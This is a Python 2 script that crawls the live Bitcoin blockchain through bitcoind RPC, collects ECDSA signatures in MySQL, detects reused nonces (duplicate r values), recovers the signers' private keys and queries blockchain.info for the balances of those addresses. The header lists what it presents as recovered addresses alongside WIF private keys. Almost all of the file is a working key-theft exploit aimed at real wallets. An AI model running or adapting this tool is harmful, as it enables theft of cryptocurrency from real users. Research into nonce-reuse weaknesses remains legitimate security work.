#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# github.com/tintinweb
#
# Have:
#       r, s
#       pubkey
#       hash (m)
#
# Need:
#       pubkey,r,s1,s2,h1,h2
'''
                      Address                               Privkey                            r
Privkey recovered:  1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT 113563387324078878147267949860139475116142082788494055785668341901521289846519
Privkey recovered:  1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT 18380471981355278106073484610981598768079378179376623360720556873242139981984
Privkey recovered:  1C8x2hqqgE2b3TZPQcFgas73xYWNh6TK9W 5JKkG6KXLCCPXN9m29ype6My7eR4AnCLaHKYrLvn6d3nd8BLjjw 19682383735358733565748628081379024202682929012377912380310432818686294127462
Privkey recovered:  1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT 6828441658514710620715231245132541628903431519484374098968817647395811175535
'''

############################
#
# CONFIG
#
############################
#              host         user   password database
MYSQL_PARMS = ("127.0.0.1", "user","","database")
############################
#
# HERE BE DRAGONS
#
############################
from ecdsa_key_recovery import EcDsaSignature

from binascii import unhexlify, hexlify
from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
import time
import logging
from pyasn1.codec.der import decoder as asn1der
import pybitcointools
import sqlite3, os
import MySQLdb
import requests

logger = logging.getLogger(__name__)
'''
\bitcoin-0.13.2\bin\bitcoind.exe --daemon --server --rpcuser=lala --rpcpassword=lolo -txindex=1 -printtoconsole (--rescan)
'''

def pause(t, critical=False):
    critical = False
    if not critical:
        print t
        return
    raw_input(t)

def bignum_to_hex(val, nbits=256):
  ret = hex((val + (1 << nbits)) % (1 << nbits)).rstrip("L").lstrip("0x")
  if len(ret)%2==1:
      return "0"+ret
  return ret

def long_to_bytes (val, endianness='big'):
    """
    Use :ref:`string formatting` and :func:`~binascii.unhexlify` to
    convert ``val``, a :func:`long`, to a byte :func:`str`.
    :param long val: The value to pack
    :param str endianness: The endianness of the result. ``'big'`` for
      big-endian, ``'little'`` for little-endian.
    If you want byte- and word-ordering to differ, you're on your own.
    Using :ref:`string formatting` lets us use Python's C innards.
    """
    # one (1) hex digit per four (4) bits
    width = val.bit_length()
    # unhexlify wants an even multiple of eight (8) bits, but we don't
    # want more digits than we need (hence the ternary-ish 'or')
    width += 8 - ((width % 8) or 8)
    # format width specifier: four (4) bits per hex digit
    fmt = '%%0%dx' % (width // 4)
    # prepend zero (0) to the width, to zero-pad the output
    s = unhexlify(fmt % val)
    if endianness == 'little':
        # see http://stackoverflow.com/a/931095/309233
        s = s[::-1]
    return s


class BtcRpc(object):
    def __init__(self, uri):
        logger.debug("init")
        self.uri = uri
        self.rpc = AuthServiceProxy(uri,timeout=600)

        # wait for rpc to be ready
        last_exc = None
        for _ in xrange(30):
            try:
                logger.info("best block: %s"%self.rpc.getbestblockhash())
                #logger.info("block count: %s" % self.rpc.getblockcount())
                break
            except Exception, e:
                last_exc = e
            logger.info("trying to connect ...")
            time.sleep(2)
        if last_exc:
            raise last_exc
        logger.debug("connected.")

    def iter_vins(self, block):
        for tx in block['tx']:
            trans = self.rpc.decoderawtransaction(self.rpc.getrawtransaction(tx))
            # tbh we only need to check vout
            for vin in trans['vin']:
                sig = vin.get("scriptSig")
                if sig:
                    dersig = asn1der.decode(sig.get("hex").decode("hex")[1:])

                    yield {'block': block['hash'],
                           'type': 'scriptSig',
                             'tx': tx,
                             #'hex': v.get("hex"),
                             'r': int(dersig[0][0]),
                             's': int(dersig[0][1])}
            # vouts
            '''
            for vout in trans['vout']:
                for k,v in vout.iteritems():
                    if k.startswith("script"):
                        for addr in v.get("addresses"):
                            yield {'block': block['hash'],
                                   'type': 'address',
                                   'tx': tx,
                                   # 'hex': v.get("hex"),
                                   'address':addr}
            '''

        #self.rpc.batch_()

    def iter_blocks(self, height=0, infinite=False):
        blockhash = self.rpc.getblockhash(height)
        while True:
            block = self.rpc.getblock(blockhash)
            yield block
            next_blockhash = block.get("nextblockhash")
            if next_blockhash:
                blockhash = next_blockhash
                continue
            # end of chain?
            if not infinite:
                # stop here if we do not want to infinitely block
                raise StopIteration()
            logger.warning("end of chain - wait a minute for next block to appear...")
            time.sleep(60)

    def get_args_for_r(self, tx, r):
        trans = self.rpc.getrawtransaction(tx, 1)
        logger.debug("trans: %r"%trans)
        # tbh we only need to check vout
        for index,vin in enumerate(trans['vin']):
            sig = vin.get("scriptSig")
            logger.debug(vin)
            if sig:
                asn_sig = sig.get("hex").decode("hex")
                asn_sequence_tag_start = asn_sig.index(
                    "\x30")  # sometimes there are more instructions than just a push, so find the 30 asn1 sequence start tag
                # print asn_sequence_tag, asn_sig.encode("hex")
                dersig = asn1der.decode(asn_sig[asn_sequence_tag_start:])
                #dersig = asn1der.decode(sig.get("hex").decode("hex")[1:])
                if long_to_bytes(int(dersig[0][0])).encode("hex")==r:
                    yield {'type': 'scriptSig',
                           'tx': tx,
                           # 'hex': v.get("hex"),
                           'r': int(dersig[0][0]),
                           's': int(dersig[0][1]),
                            'in_tx': vin['txid'],
                           'pub':dersig[1],
                           'index':index}

    def get_scriptsigs(self, tx):
        trans = self.rpc.getrawtransaction(tx, 1)
        print "trans",trans
        # tbh we only need to check vout
        for index,vin in enumerate(trans['vin']):
            sig = vin.get("scriptSig")
            print vin
            if sig:
                asn_sig = sig.get("hex").decode("hex")
                asn_sequence_tag_start = asn_sig.index(
                    "\x30")  # sometimes there are more instructions than just a push, so find the 30 asn1 sequence start tag
                # print asn_sequence_tag, asn_sig.encode("hex")
                dersig = asn1der.decode(asn_sig[asn_sequence_tag_start:])
                yield {'type': 'scriptSig',
                       'tx': tx,
                       # 'hex': v.get("hex"),
                       'r': long(dersig[0][0]),
                       's': long(dersig[0][1]),
                        'in_tx': vin['txid'],
                       'pub':dersig[1],
                       'index':index}

import ecdsa
from ecdsa import VerifyingKey
from ecdsa.ecdsa import Signature

curve = ecdsa.SECP256k1

class BTCSignature(EcDsaSignature):

    def __init__(self, sig, h, pubkey, curve=ecdsa.SECP256k1):
        super(BTCSignature, self).__init__(sig, h, BTCSignature._fix_pubkey(pubkey), curve=curve)

    @staticmethod
    def _fix_pubkey(p):
        # SIG
        # PUSH 41
        # type 04
        if p.startswith("\x01\x41\x04"):
            return p[3:]
        return p

    def recover_from_btcsig(self, btcsig):
        return self.recover_nonce_reuse(btcsig)
        #print self.pubkey_orig==btcsig.pubkey_orig
        #return self.recover_nonce(btcsig.sig, btcsig.h)

    def to_btc_pubkey(self):
        return ('\04' + self.signingkey.verifying_key.to_string()).encode('hex')

    def to_btc_privkey(self):
        return self.signingkey.to_string().encode("hex")

    def pubkey_to_address(self):
        return pybitcointools.pubkey_to_address(self.to_btc_pubkey())

    def privkey_to_address(self):
        return pybitcointools.privkey_to_address(self.to_btc_privkey())

    def privkey_to_wif(self):
        return pybitcointools.encode_privkey(self.to_btc_privkey(), "wif")

    def privkey_wif(self):
        return self.privkey_to_wif()

    def address(self):
        return self.privkey_to_address()

def selftest():
    public_key_hex = 'a50eb66887d03fe186b608f477d99bc7631c56e64bb3af7dc97e71b917c5b364' + '7954da3444d33b8d1f90a0d7168b2f158a2c96db46733286619fccaafbaca6bc'
    msghash1 = '01b125d18422cdfa7b153f5bcf5b01927cf59791d1d9810009c70cd37b14f4e6'
    msghash2 = '339ff7b1ced3a45c988b3e4e239ea745db3b2b3fda6208134691bd2e4a37d6e1'
    sig1_hex = '304402200861cce1da15fc2dd79f1164c4f7b3e6c1526e7e8d85716578689ca9a5dc349d02206cf26e2776f7c94cafcee05cc810471ddca16fa864d13d57bee1c06ce39a3188'
    sig2_hex = '304402200861cce1da15fc2dd79f1164c4f7b3e6c1526e7e8d85716578689ca9a5dc349d02204ba75bdda43b3aab84b895cfd9ef13a477182657faaf286a7b0d25f0cb9a7de2'

    t = asn1der.decode(sig1_hex.decode("hex"))
    sig1 = Signature(long(t[0][0]), long(t[0][1]))
    t = asn1der.decode(sig2_hex.decode("hex"))
    sig2 = Signature(long(t[0][0]), long(t[0][1]))

    print sig1.r, sig1.s
    print sig2.r, sig2.s
    print msghash1
    print msghash2
    print public_key_hex



    sigx1 = BTCSignature(sig=sig1, h=long(msghash1, 16), pubkey=public_key_hex.decode("hex"))
    sigx2 = BTCSignature(sig=(sig2.r, sig2.s), h=long(msghash2, 16), pubkey=public_key_hex.decode("hex"))
    print "%r" % sigx1.recover_nonce_reuse(sigx2)
    print sigx1.signingkey
    print sigx1.to_btc_pubkey(), sigx1.to_btc_privkey()
    print sigx1.pubkey_to_address(), sigx1.privkey_to_wif()
    print sigx1.export_key()
    print "----sigx2---"

    sig1 = EcDsaSignature(sig=sig1, h=msghash1.decode("hex"), pubkey=public_key_hex.decode("hex"))
    sig2 = EcDsaSignature(sig=(sig2.r, sig2.s), h=msghash2.decode("hex"), pubkey=public_key_hex.decode("hex"))
    print sig1.recover_nonce_reuse(sig2)
    print sig1.export_key()
    raw_input("--End of Selftest -- press any key to continue--")


import pprint

SIGHASH_ALL = 1
SIGHASH_NONE = 2
SIGHASH_SINGLE = 3
SIGHASH_ANYONECANPAY = 0x80

def verify_vin_old(txid, index):

    # get raw transaction (txid)  <-- vin[0]: scriptSig
    rpc = BtcRpc("http://lala:lolo@127.0.0.1:8332")
    rawtx = rpc.rpc.getrawtransaction(txid)
    jsontxverbose = rpc.rpc.getrawtransaction(txid,1)
    #pprint.pprint(jsontxverbose)
    jsontx = pybitcointools.deserialize(rawtx)
    pprint.pprint(jsontx)
    scriptSigasm = jsontxverbose['vin'][index]['scriptSig']['asm']

    logger.debug(scriptSigasm)

    scriptSig = jsontx['ins'][index]['script']
    sigpubdecoded = asn1der.decode(scriptSig.decode("hex")[1:])  # skip first push
    sig = long(sigpubdecoded[0][0]), long(sigpubdecoded[0][1])
    pubkey = sigpubdecoded[1]
    sighash_type = pubkey[0]

    logger.debug("sighash type: %r" % sighash_type)
    push = pubkey[1]
    btc_pubkey_type = pubkey[2]
    pubkey = pubkey[3:]

    logger.debug("r %s s %s"%(hex(sig[0]),hex(sig[1])))
    logger.debug(pubkey.encode("hex"))
    # generate signdata
    # replace input script with funding script of 17SkEw2md5avVNyYgj6RiXuQKNwkXaxFyQ
    for txin in jsontx['ins']:
        txin['script']=''
    funding_txid = jsontxverbose['vin'][index]['txid']
    funding_tx = rpc.rpc.getrawtransaction(funding_txid,1)
    #pprint.pprint(funding_tx)
    funding_script = funding_tx['vout'][0]['scriptPubKey']['hex']
    jsontx['ins'][index]['script']=funding_script
    signdata= pybitcointools.serialize(jsontx) + "01000000"  #SIGHASH ALL
    import hashlib
    digest = hashlib.sha256(hashlib.sha256(signdata.decode("hex")).digest()).digest()
    logger.debug(digest[::-1].encode("hex"))

    vk = VerifyingKey.from_string(pubkey, curve=curve)
    logger.debug("verify --> %s "%(vk.pubkey.verifies(int(digest.encode("hex"),16),Signature(sig[0],sig[1]))))

    #print vk.verify_digest(scriptSigasm.split("[ALL]",1)[0].decode("hex"), digest, sigdecode=ecdsa.util.sigdecode_der)

    return BTCSignature(sig=Signature(sig[0],sig[1]),
                       h=int(digest.encode("hex"),16),
                       pubkey=pubkey,
                       )

def verify_vin(txid, index):
    txdump = dump_tx_ecdsa(txid, index)
    #i, pub, txid, s, r, x, z
    #    |               |   \--- hash
    #    |                \------ pub decoded?
    #     \---------------------- pub orig?
    import pprint
    pprint.pprint(txdump)
    print txdump['z'].decode("hex")
    print int(txdump['z'],16)
    def fix_pubkey(p):
        if p.startswith("04"):
            return p[2:]
        return p
    txdump['pub'] = fix_pubkey(txdump['pub'])
    #vk = VerifyingKey.from_public_point(int(txdump['x'],16),curve=curve)
    #vk = VerifyingKey.from_string(txdump['pub'], curve=curve)
    #print vk
    #logger.debug("verify --> %s " % (vk.pubkey.verifies(int(digest.encode("hex"), 16), Signature(sig[0], sig[1]))))

    # get raw transaction (txid)  <-- vin[0]: scriptSig
    rpc = BtcRpc("http://lala:lolo@127.0.0.1:8332")
    rawtx = rpc.rpc.getrawtransaction(txid)
    jsontxverbose = rpc.rpc.getrawtransaction(txid,1)
    #pprint.pprint(jsontxverbose)
    jsontx = pybitcointools.deserialize(rawtx)
    pprint.pprint(jsontx)
    scriptSigasm = jsontxverbose['vin'][index]['scriptSig']['asm']

    logger.debug(scriptSigasm)

    scriptSig = jsontx['ins'][index]['script']
    sigpubdecoded = asn1der.decode(scriptSig.decode("hex")[1:])  # skip first push
    sig = long(sigpubdecoded[0][0]), long(sigpubdecoded[0][1])
    pubkey = sigpubdecoded[1]
    sighash_type = pubkey[0]

    logger.debug("sighash type: %r" % sighash_type)
    push = pubkey[1]
    btc_pubkey_type = pubkey[2]
    pubkey = pubkey[3:]

    logger.debug("r %s s %s"%(hex(sig[0]),hex(sig[1])))

    logger.debug("pubkey:  %r"%pubkey.encode("hex"))
    logger.debug("txdump: %r"%txdump['pub'])

    '''
    # generate signdata
    # replace input script with funding script of 17SkEw2md5avVNyYgj6RiXuQKNwkXaxFyQ
    for txin in jsontx['ins']:
        txin['script']=''
    funding_txid = jsontxverbose['vin'][index]['txid']
    funding_tx = rpc.rpc.getrawtransaction(funding_txid,1)
    #pprint.pprint(funding_tx)
    funding_script = funding_tx['vout'][0]['scriptPubKey']['hex']
    jsontx['ins'][index]['script']=funding_script
    signdata= pybitcointools.serialize(jsontx) + "01000000"  #SIGHASH ALL
    import hashlib
    digest = hashlib.sha256(hashlib.sha256(signdata.decode("hex")).digest()).digest()
    logger.debug(digest[::-1].encode("hex"))
    pause("--->")
    '''
    pause("create verifying key...")

    vk = VerifyingKey.from_string(txdump['pub'].decode("hex"), curve=curve)
    digest = txdump['z']
    print repr(pubkey)
    print repr(txdump['pub'])
    z = int(digest.decode("hex"),16)
    verifies = vk.pubkey.verifies(z,Signature(sig[0],sig[1]))
    logger.debug("verify --> %s "%(verifies))
    if not verifies:
        pause("--verify false!--",critical=True)

    #print vk.verify_digest(scriptSigasm.split("[ALL]",1)[0].decode("hex"), digest, sigdecode=ecdsa.util.sigdecode_der)

    return BTCSignature(sig=Signature(sig[0],sig[1]),
                       h=z,
                       pubkey=pubkey,
                       )
##FIXME: db has some unhex(00000000000000000000000...00) datasets for r/s .. resolve them
def recover_key_for_r(r):
    r=r.lower()
    txs=set([])
    bsigs = []
    # sqilte get txids for colliding r
    #
    #db = sqlite3.connect("blockchain.new.sqlite3")
    logger.debug("db connect")
    db = MySQLdb.connect(*MYSQL_PARMS)
    cursor = db.cursor()
    logger.debug("query")
    cursor.execute('SELECT HEX(tx) FROM scriptSig_deduped WHERE r=UNHEX(%s)', (r,))
    for row in cursor.fetchall():
        txs.add(row[0])

    logger.debug("transactions: %r" % txs)
    logger.debug("btc connect...")
    rpc = BtcRpc("http://lala:lolo@127.0.0.1:8332")
    logger.debug("btc connected!")
    for nr,txid in enumerate(txs):
        try:
            logger.debug("working txid: %r"%txid)
            args = rpc.get_args_for_r(txid, r).next()
            logger.debug("args: %r" % args)
            bsigs.append(verify_vin(txid,args['index']))
            logger.debug("txid: %r" % txid)
        except Exception, ae: # assertionerror
            logger.exception(ae)


    # try all combinations to recover privkey
    # todo: might have multiple results! better yield results and filter already found ones..
    #       e.g. if multiple r but different pubkey
    import itertools
    print bsigs
    ex= None
    for comb in itertools.combinations(bsigs, 2):
        try:
            comb[0].recover_from_btcsig(comb[1])
            return comb[0]
        except AssertionError, e:
            ex = e
            print e
        pause("--nextbtcsig--")
    if ex:
        raise ex
    raise Exception("--cannot-recover--")

def get_dup_r():
    #db = sqlite3.connect("blockchain.new.sqlite3")
    db = MySQLdb.connect(*MYSQL_PARMS)
    cursor = db.cursor()
    sql_dup = """SELECT r,s,tx, COUNT(r) as c
FROM scriptSig_deduped
GROUP BY r HAVING ( c > 1 )"""
    for r,s,tx in cursor.execute(sql_dup):
        yield {'r':r,'s':s,'tx':tx}

def batch(iterable, n=1):
    l = len(iterable)
    for ndx in range(0, l, n):
        yield iterable[ndx:min(ndx + n, l)]

def scriptsig_to_ecdsa_sig(asn_sig):
    asn_sequence_tag_start = asn_sig.index(
        "\x30")  # sometimes there are more instructions than just a push, so find the 30 asn1 sequence start tag
    # print asn_sequence_tag, asn_sig.encode("hex")
    dersig = asn1der.decode(asn_sig[asn_sequence_tag_start:])

    return {  # 'hex': v.get("hex"),
        'r': long(dersig[0][0]),
        's': long(dersig[0][1])}

def get_sigpair_from_csv(csv_in, start=0, skip_to_tx=None, want_tx=[]):
    want_tx=set(want_tx)
    skip_entries = True
    with open(csv_in,'r') as f:
        for nr,line in enumerate(f):
            if nr<start:
                if nr%100000==0:
                    print "skip",nr,f.tell()
                continue
            if nr % 10000000 == 0:
                print "10m", nr
            try:
                # read data
                cols = line.split(";",1)
                tx = cols[0].strip()

                if skip_to_tx and tx==skip_to_tx:
                    skip_entries=False
                    # skip this entry - already in db
                    continue
                if skip_to_tx and skip_entries:
                    print "skiptx",nr, tx
                    continue
                if want_tx and tx not in want_tx:
                    continue

                scriptsig = cols[1].decode("base64")
                #print repr(scriptsig)
                #print pybitcointools.deserialize_script(scriptsig)
                sig = scriptsig_to_ecdsa_sig(scriptsig)
                sig['tx'] = tx
                sig['nr'] = nr
                yield sig
            except ValueError, ve:
                #print tx,repr(ve)
                pass
            except Exception, e:
                print tx, repr(e)

def find_fixed_id_for_tx_s(f, _tx, _s):
    f.seek(0)
    for line in f:
        line = line.strip()
        if not line: continue
        r,s,tx = line.split(",")
        if s.lower()==_s.lower() and tx.lower()==_tx.lower():
            return r,s,tx

def getrawtx(txid):
    for _ in xrange(10):
        e=None
        try:
            rpc = BtcRpc("http://lala:lolo@127.0.0.1:8332")
            return rpc.rpc.getrawtransaction(txid, 1)
        except Exception , e:
            pass
    raise e

def dump_tx_ecdsa(txid, i):
    tx = getrawtx(txid)

    vin = tx['vin'][i]
    if 'coinbase' in vin:
        return

    prev_tx = getrawtx(vin['txid'])
    prev_vout = prev_tx['vout'][vin['vout']]
    prev_type = prev_vout['scriptPubKey']['type']
    script = prev_vout['scriptPubKey']['hex']

    if prev_type == 'pubkeyhash':
        sig, pub = vin['scriptSig']['asm'].split(' ')
    elif prev_type == 'pubkey':
        sig = vin['scriptSig']['asm']
        pub, _ = prev_vout['scriptPubKey']['asm'].split(' ')
    else:
        logger.warning("%6d %s %4d ERROR_UNHANDLED_SCRIPT_TYPE" % (txid, i))
        raise

    x = pub[2:66]

    #print sig
    if sig[-1] == ']':
        sig, hashcode_txt = sig.strip(']').split('[')
        if hashcode_txt == 'ALL':
            hashcode = 1
        elif hashcode_txt == 'SINGLE':
            hashcode = 3
        else:
            print hashcode_txt
            logger.warning("xx %s %4d ERROR_UNHANDLED_HASHCODE" % (txid, hashcode_txt))
            raise
    else:
        hashcode = int(sig[-2:], 16)
        sig = sig[:-2]


    modtx = pybitcointools.serialize(pybitcointools.signature_form(pybitcointools.deserialize(tx['hex']), i, script, hashcode))
    z = hexlify(pybitcointools.txhash(modtx, hashcode))

    _, r, s = pybitcointools.der_decode_sig(sig)
    r = pybitcointools.encode(r, 16, 64)
    s = pybitcointools.encode(s, 16, 64)

    #print verify_tx_input(tx['hex'], i, script, sig, pub)
    return {'txid':txid,'i':i,'x':x,'r':r,'s':s,'z':z,'pub':pub}

def get_balance_for_address(addr):
    r = requests.get("https://blockchain.info/de//q/addressbalance/%s"%addr)
    return int(r.text)

def check_balances():
    db = MySQLdb.connect(*MYSQL_PARMS)
    cursor = db.cursor()
    cursor.execute(
        "select address from bitcoin.privkeys")
    for a in cursor.fetchall():
        try:
            print "%s - %s"%(a, get_balance_for_address(a))
        except Exception, e:
            print "%s - %s" % (a, e)
    raw_input("-->done")

def recover_privkey():
    db = MySQLdb.connect(*MYSQL_PARMS)
    cursor_insert = db.cursor()
    cursor = db.cursor()

    cursor.execute("select id,hex(r) from bitcoin.r_dup where r not in (select r from bitcoin.privkeys) order by RAND()")
    #cursor.execute("select id,hex(r) from bitcoin.r_dup where r=unhex('E44A8A310ECB6CF6E2D7BC9473871FB6526DAA7D18A1F8E32CEDCC7E2BCB7154')")

    for id, r in cursor.fetchall():
        logger.info("%r -- %r"%(id,r))
        if "00000000000000000000000000000000000000000000000000000000000000" in r:
            continue

        try:
            rsig = recover_key_for_r(r)
            print "->Privkey recovered: ", rsig.address(), rsig.privkey_wif(), r
            recovered_sigs.append(rsig)
            cursor_insert.execute("select privkey from bitcoin.privkeys where r=unhex(%s)",(r,))
            if not cursor_insert.rowcount:
                cursor_insert.execute("INSERT IGNORE INTO bitcoin.privkeys (r,address,privkey) values (unhex(%s),%s,%s) ",(r,rsig.address(), rsig.privkey_wif()))
                db.commit()
            else:
                pause("--duplicate--")
            #cursor.executemany("UPDATE bitcoin.privkeys set address=%s, privkey=%s where r=unhex(%s)",(rsig.address, rsig.privkey_wif,r))
            pause("YAY")
        except (Exception,AssertionError) as ae:
            print ae
            #raise ae
        print recovered_sigs
        pause("--next_r---")



    print ""
    print ""
    print "                      Address                               Privkey                            r"
    for rsig in recovered_sigs:
        print "Privkey recovered: ", rsig.address(), rsig.privkey_wif(), rsig.sig.r
    print ""
    raise


### --- import stuff

class DbMysql(object):
    def __init__(self, host, username, password, db):
        self.db = MySQLdb.connect(host=host,
                                  user=username,
                                  passwd=password,
                                  db=db)
        self.cursor = self.db.cursor()

    def insert_batch_scriptSig(self, entries, ignore=False):
        data = [(e['tx'], bignum_to_hex(e['r']), bignum_to_hex(e['s'])) for e in entries]
        #self.cursor.execute("INSERT IGNORE INTO scriptSig (tx,r,s) VALUES (%s, x%s, %s)", data[0])
        for bdata in batch(data, 50):
            self.cursor.executemany("INSERT IGNORE INTO scriptsig_deduped (tx,r,s) VALUES (UNHEX(%s), UNHEX(%s), UNHEX(%s))",bdata)
        logger.info("db insert: scriptsig_deduped %d"%len(data))

    def update_stats(self, key, value):
        self.cursor.execute("INSERT INTO `stats` VALUES (%s,%s) on DUPLICATE KEY UPDATE `value`=%s", (key,value,value))
        logger.info("update stats: %-40s = %s" % (key, value))

    def get_stats(self, key, default):
        try:
            self.cursor.execute('SELECT * FROM stats WHERE `key`=%s LIMIT 1', (key,))
            for row in self.cursor.fetchall():
                return row[1] if len(row[1]) else default
        except Exception, e:
            return default

        return default

    def commit(self):
        self.db.commit()

    def close(self):
        self.commit()
        self.db.close()

def import_csv_to_mysql(csv_in):
    """
    config:  path_tx_in and DbMysql credentials

    :return:
    """
    logging.basicConfig(loglevel=logging.DEBUG)
    logger.setLevel(logging.DEBUG)
    logger.debug("hi")


    db = DbMysql(*MYSQL_PARMS)
    sigs = []

    t_read_diff = time.time()
    for sig in get_sigpair_from_csv(csv_in=csv_in,
                                    start=0,
                                    #skip_to_tx='a27268516da6f91599a99c7ee9ac66fac4da75f70da3421d8d4eec46767b8234',
                                    ):
        sigs.append(sig)
        if len(sigs) > 1000000:
            logger.debug("%u|about to commit 1mio sigs, reading csv took %f" % (
            sig['nr'], time.time() - t_read_diff))
            t_db_start = time.time()
            db.insert_batch_scriptSig(sigs)
            db.commit()
            logger.debug("!! db insert took: %f" % (time.time() - t_db_start))
            t_read_diff = time.time()
            sigs = []

    # make sure to commit outstanding sigs
    if sigs:
        db.insert_batch_scriptSig(sigs)
        db.commit()
    db.close()

if __name__=="__main__":
    logging.basicConfig(loglevel=logging.DEBUG, format="%(funcName)-20s -  %(message)s")
    logger.setLevel(logging.DEBUG)
    logger.warning("#" * 40)
    logger.warning("#" + "WARNING: experimental script. no warranty. you've been warned!")
    logger.warning("#" * 40)

    import sys
    args = sys.argv[1:]
    if not len(args):
        time.sleep(0.5) # too lazy to look up how to flush the logger
        print "USAGE: <mode> <args>"
        print "\n"
        print "examples:   this.py [selftest] import tx_in.csv.tmp  # import tx_in.csv.tmp to mysql db"
        print "            this.py recover                          # recover nonce_reuse signatures from mysql db"
        print "\n\n MYSQL config see var: MYSQL_PARMS "
        sys.exit(1)



    if "selftest" in args:
        logger.debug("selftest")
        selftest()
        args.remove("selftest")

    if args[0]=="import":
        logger.info("import: %r" % args)
        import_csv_to_mysql(args[1])
        logger.info("--done--")
        sys.exit()

    if args[0]=="recover":
        logger.debug("recover")
        recovered_sigs = []
        #check_balances()
        recover_privkey()
        # rsig = recover_key_for_r(18380471981355278106073484610981598768079378179376623360720556873242139981984L)
        dup_r = get_dup_r
        """
        dup_r = [113563387324078878147267949860139475116142082788494055785668341901521289846519,
                 18380471981355278106073484610981598768079378179376623360720556873242139981984,
                 19682383735358733565748628081379024202682929012377912380310432818686294127462,
                 6828441658514710620715231245132541628903431519484374098968817647395811175535]
        #dup_r = [bignum_to_hex(19682383735358733565748628081379024202682929012377912380310432818686294127462),]
        dup_r = ["2B83D59C1D23C08EFD82EE0662FEC23309C3ADBCBD1F0B8695378DB4B14E7366"]
        #dup_r = (bignum_to_hex(rr) for rr in dup_r)

        #dup_r = [bignum_to_hex(6828441658514710620715231245132541628903431519484374098968817647395811175535)]
        """
        for r in dup_r:
            r = r.lower()
            print "r->",r
            try:
                rsig = recover_key_for_r(r)
                print "->Privkey recovered: ", rsig.address(), rsig.privkey_wif(), r
                recovered_sigs.append(rsig)
            except Exception, ae:
                print repr(ae)
                raise ae

        print ""
        print ""
        print "                      Address                               Privkey                            r"
        for rsig in recovered_sigs:
            print "Privkey recovered: ",rsig.address(), rsig.privkey_wif(), rsig.sig.r
        print ""
